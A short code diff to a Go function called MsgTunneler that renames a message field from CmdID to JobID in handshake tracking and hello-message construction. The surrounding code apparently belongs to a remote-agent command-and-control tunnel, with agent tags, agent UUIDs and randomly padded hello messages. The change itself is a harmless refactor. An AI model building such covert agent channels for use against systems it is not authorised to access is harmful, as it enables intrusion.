@@ -137,7 +137,7 @@ func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def
 
 			// if it's a handshake reply
 			if msg.Tag == "handshake" {
-				HandShakes.Store(msg.CmdID, true)
+				HandShakes.Store(msg.JobID, true)
 				continue
 			}
 
@@ -179,7 +179,7 @@ func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def
 
 			// send hello
 			hello_msg.CmdSlice = []string{util.RandStr(util.RandInt(1, 100))}
-			hello_msg.CmdID = uuid.NewString()
+			hello_msg.JobID = uuid.NewString()
 			hello_msg.Tag = config.AgentTag
 			hello_msg.AgentUUID = config.AgentUUID
 			hello_msg.Time = time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST")
@@ -197,8 +197,8 @@ func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def
 				util.TakeABlink()
 				continue
 			}
-			HandShakes.Store(hello_msg.CmdID, false)
-			if !wait_hello(hello_msg.CmdID) {
+			HandShakes.Store(hello_msg.JobID, false)
+			if !wait_hello(hello_msg.JobID) {
 				cancel()
 				break
 			}
